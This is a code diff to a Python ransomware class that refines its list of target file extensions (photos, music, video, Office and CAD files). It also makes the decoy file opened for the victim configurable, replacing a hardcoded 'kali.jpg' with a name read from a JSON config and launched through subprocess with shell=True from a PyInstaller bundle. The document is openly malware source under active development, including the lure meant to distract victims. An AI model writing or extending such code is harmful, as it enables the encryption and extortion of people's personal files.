@@ -24,8 +24,7 @@ class Ransomware:
     def __init__(self, starting_dir_test):
         self.interesting_extensions = [
             'dwg', 'dxf', 'rtd', 'rft', 'rte', 'rvg', 'ies', 'rfa', 'rds'
-                                                                    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd',
-            'raw',
+            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd','raw',
             'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',
             'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',
             'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
@@ -45,6 +44,7 @@ class Ransomware:
         self.starting_dir_test = starting_dir_test
         self.user_email = ''
         self.user_password = ''
+        self.fake_file_name = ''
 
     def main(self):
         # start = time.time()
@@ -82,6 +82,7 @@ class Ransomware:
                 info = json.loads(content)
                 self.user_email = info['email']
                 self.user_password = info['password']
+                self.fake_file_name = info['fake_file_name']
 
     def gen_pass(self):
         new_password = modules.cryptography.generate_password()
@@ -153,7 +154,7 @@ class Ransomware:
                     yield os.path.join(root, name)
 
     def open_fake_file(self):
-        subprocess.Popen(normalize_path_name(sys._MEIPASS, 'kali.jpg'), shell=True)
+        subprocess.Popen(normalize_path_name(sys._MEIPASS, self.fake_file_name), shell=True)
 
 
 class RansomGUI(Ransomware):
